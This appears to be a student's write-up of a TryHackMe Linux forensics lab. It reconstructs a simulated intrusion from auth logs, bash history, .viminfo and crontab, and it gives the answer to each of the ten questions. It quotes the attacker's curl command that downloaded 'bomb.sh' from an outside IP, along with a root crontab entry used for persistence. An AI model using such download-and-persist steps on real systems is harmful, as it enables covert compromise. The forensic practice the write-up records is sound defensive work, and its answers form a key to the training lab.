# TryHackMe – Linux Investigation Challenge
## Practical Lab Documentation

This repository contains my hands-on forensic investigation of a compromised Linux host provided in the TryHackMe environment. 
The goal of this lab is to practice foundational Linux DFIR (Digital Forensics and Incident Response) skills: analyzing system logs, identifying unauthorized access, uncovering persistence mechanisms, and reconstructing the attacker's activities.

## Environment
* **Platform:** TryHackMe
* **Room:** Linux Forensics
* **Operating System:** Ubuntu 20.04.6 LTS
* **Kernel Version:** 5.15.0-1077-aws
* **Architecture:** x86_64

## Core Concepts Practiced
* **System & OS Information:** Enumerating release details, user accounts (`/etc/passwd`), and sudoers.
* **System Configuration:** Auditing network interfaces, open ports (`netstat`), and running processes (`ps`).
* **Persistence Mechanisms:** Inspecting Cron jobs, systemd services, and shell startup scripts (`.bashrc`).
* **Evidence of Execution:** Analyzing command history (`.bash_history`) and authentication logs (`/var/log/auth.log`).
* **Log Analysis:** Reviewing syslog and third-party application logs for indicators of compromise (IOCs).

---

## Investigation Reference Tool
During this lab, the following **Linux Forensics Cheatsheet** provided by TryHackMe was used to identify critical file locations and forensic artifacts:

<img width="630" height="892" alt="image" src="https://github.com/user-attachments/assets/cb427c2a-9277-435d-bc7b-81cbebde72cc" />

---

## Tasks & Solutions

### 1. The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

#### Method
To identify commands executed with elevated privileges, I analyzed the authentication logs located in `/var/log`. 
1. Initially, I searched the current `auth.log` file using `grep sudo`, but found no relevant installation commands.
2. I then inspected the rotated log file `auth.log.1`, which often contains older session data.
3. By filtering for `sudo`, I identified a log entry where the user `cybert` used `sudo` to install a package via `apt`.

**Commands used:**
`cat /var/log/auth.log.1 | grep sudo`

**Screenshot:**
<img width="1325" height="434" alt="image" src="https://github.com/user-attachments/assets/eb9143ec-1da3-488d-8f01-0f144b405498" />

<img width="1343" height="43" alt="image" src="https://github.com/user-attachments/assets/5ebcb59e-cb88-4573-bf0b-9a05e2476bbe" />


#### Answer
/usr/bin/apt install dokuwiki

### 2. What was the present working directory (PWD) when the previous command was run?

#### Method
The information regarding the working directory is embedded within the same log entry in `auth.log.1` as the installation command identified in the previous task. By analyzing the metadata of the `sudo` event for the `apt install` command, the `PWD` (Present Working Directory) field explicitly states the location from which the command was executed.

**Log details analyzed:**
* **User:** cybert
* **Command:** /usr/bin/apt install dokuwiki
* **PWD Field:** /home/cybert

**Screenshot:**
<img width="1412" height="52" alt="image" src="https://github.com/user-attachments/assets/685f0b4d-60a1-406b-bc40-f223607e517b" />

#### Answer
/home/cybert

### 3. Which user was created after the package from the previous task was installed?

#### Method
To identify any new users created by the attacker or the system, I searched the authentication logs for the execution of user management binaries. 
1. Since the volume of logs was manageable, I performed a targeted search using `grep` for the `adduser` command within `/var/log/auth.log.1`.
2. This revealed a specific entry where the user `cybert` (acting with root privileges) created a new account.
3. The timestamp of this action follows the previously identified package installation, confirming it as a subsequent step in the attacker's activity.

**Command used:**
`cat /var/log/auth.log.1 | grep adduser`

**Screenshot:**
<img width="1355" height="57" alt="image" src="https://github.com/user-attachments/assets/49a290ef-3115-42f6-b171-01cd29059dbe" />

#### Answer
it-admin

### 4. A user was then later given sudo privileges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

#### Method
To find when the `sudoers` file was modified, I looked for the execution of the `visudo` command. This tool is the standard and recommended way to grant sudo privileges to users in Linux.
1. Based on the investigation hint, I focused on identifying instances where `visudo` was called with root privileges.
2. I executed `grep` on `auth.log.1` to filter for this specific command.
3. The search returned two instances:
   * **Dec 22 07:58:24:** Performed by user `ubuntu`.
   * **Dec 28 06:27:34:** Performed by user `cybert`.
4. Since the package installation and the creation of the `it-admin` account occurred on **Dec 28**, the second entry represents the attacker's action to solidify elevated access for the new accounts.

**Command used:**
`cat /var/log/auth.log.1 | grep visudo`

**Screenshot:**
<img width="1212" height="146" alt="image" src="https://github.com/user-attachments/assets/e01d9884-dca1-4f4c-b514-4e8d23df54d8" />


#### Answer
Dec 28 06:27:34

### 5. A script file was opened using the "vi" text editor. What is the name of this file?

#### Method
To identify which files were accessed or modified by the attacker using text editors, I searched the authentication logs for the execution of `vi`. 
1. I used `grep` to filter `auth.log.1` for the string `vi`. 
2. The results displayed a command executed by the newly created user `it-admin` with root privileges.
3. The log entry shows that `it-admin` used `/usr/bin/vi` to open a file named `bomb.sh` located in their home directory. 

**Command used:**
`cat /var/log/auth.log.1 | grep vi`

**Screenshot:**
<img width="1316" height="212" alt="image" src="https://github.com/user-attachments/assets/cb3a4a9b-7a6e-4b8a-8bfb-db900672dfd5" />


#### Answer
bomb.sh

### 6. That bomb.sh file is a huge red flag! What is the command used that created the file bomb.sh?

#### Method
Since the `bomb.sh` file was no longer present on the file system, I investigated the command history to determine its origin. 
1. I navigated to the home directory of the suspicious user `it-admin` and inspected their `.bash_history` file.
2. The history revealed that the user utilized the `curl` command to download the script from a remote server (`10.10.158.38`) on port `8080`.
3. The command included the `--output` flag, which saved the downloaded content directly as `bomb.sh`.
4. The history also confirms the subsequent use of `sudo vi bomb.sh` and the final deletion of the file using `rm bomb.sh` to hide evidence.

**Command discovered in .bash_history:**
`curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

**Screenshot:**

<img width="741" height="254" alt="image" src="https://github.com/user-attachments/assets/9d11c1bd-a5ae-4b9a-852c-f64ebf71a360" />


#### Answer
curl 10.10.158.38:8080/bomb.sh --output bomb.sh

### 7. The file was renamed and moved to a different directory. What is the full path of this file now?

#### Method
Since the file `bomb.sh` was deleted from its initial location, I investigated whether the attacker had moved or renamed it using the editor's internal commands. 

1. I inspected the `.viminfo` file in `/home/it-admin/`. This file acts as a forensic artifact, storing the history of commands executed within the Vim editor.
2. I discovered the following entry: `|2,0,1672208983,,"saveas /bin/os-update.sh"`.
3. **Forensic Correlation:** To confirm this action was related to `bomb.sh`, I analyzed the Unix timestamp `1672208983` (Dec 28, 06:29:43). This is exactly 29 seconds after the `auth.log` recorded the opening of `bomb.sh` (06:29:14).
4. This sub-minute correlation proves that the attacker used the `saveas` function inside Vim to disguise the malicious script as a legitimate system utility in the `/bin/` directory.

**Command used to inspect Vim history:**
`cat /home/it-admin/.viminfo`

**Screenshot:**

<img width="779" height="869" alt="image" src="https://github.com/user-attachments/assets/aaf0e037-c39d-45f8-8776-03cde74a7f01" />


#### Answer
/bin/os-update.sh

### 8. When was the file from the previous question last modified? (Format: Month Day HH:MM)

#### Method
To determine the exact time the malicious script was placed in the system directory, I analyzed the file's metadata. 
1. Initially, I was looking for a way to get a more precise timestamp than a standard `ls -l` provides. 
2. Following the investigation hint, I learned and utilized the `ls -al --full-time` command. This was a new and valuable command for me, allowing for high-precision forensic analysis of file timestamps.
3. I executed this command on the renamed file `/bin/os-update.sh`.
4. The output showed a modification time of **06:29:43.998004273**.
5. **Verification:** This timestamp perfectly correlates with the Unix timestamp found in the `.viminfo` file (1672208983), confirming exactly when the attacker finalized the file's move.

**Command used:**
`ls -al --full-time /bin/os-update.sh`

**Screenshot:**

<img width="824" height="84" alt="image" src="https://github.com/user-attachments/assets/8cef3547-ba6f-4508-bf8a-dc7b2e60b860" />

#### Answer
Dec 28 06:29

### 9. What is the name of the file that will get created when the malicious script executes?

#### Method
To understand the impact of the discovered malicious script without executing it, I performed a static analysis of its contents.
1. I navigated to `/bin/` and used the `cat` command to read the source code of `os-update.sh`.
2. Upon reviewing the script, I identified a conditional logic block that triggers if a certain output is empty.
3. The final line of this block uses the `echo` command and a redirection operator (`>`) to create a new file in the root directory.
4. The script is designed to output a taunting message into a file named `goodbye.txt`.

**Command used:**
`cat /bin/os-update.sh`

**Screenshot:**

<img width="1165" height="201" alt="image" src="https://github.com/user-attachments/assets/8203f3be-d875-488f-817a-0201b64f57d1" />


#### Answer
goodbye.txt


### 10. At what time will the malicious file trigger? (Format: HH:MM AM/PM)

#### Method
To determine how the malicious script was scheduled to execute, I searched for persistence mechanisms, specifically Cron jobs.
1. I started by searching the authentication logs for Cron-related activity using `grep cron /var/log/auth.log.1`.
2. The logs revealed that the user `it-admin` executed `nano /etc/crontab` with root privileges at **06:30:10**.
3. I then inspected the system-wide crontab file by running `cat /etc/crontab`.
4. At the end of the file, I found a new entry: `0 8 * * * root /bin/os-update.sh`.
5. Using the **Crontab Guru** tool (as suggested in the investigation hint), I translated the Cron syntax:
   * `0` (minute)
   * `8` (hour)
   * `* * *` (every day, month, and day of the week)
6. This confirms the script is scheduled to trigger every day at **08:00 AM**.

**Command used:**
`nano /etc/crontab`

**Screenshot:**

<img width="1126" height="354" alt="image" src="https://github.com/user-attachments/assets/2a7d216f-0cee-4800-8e03-42d486ac9648" />


#### Answer
08:00 AM
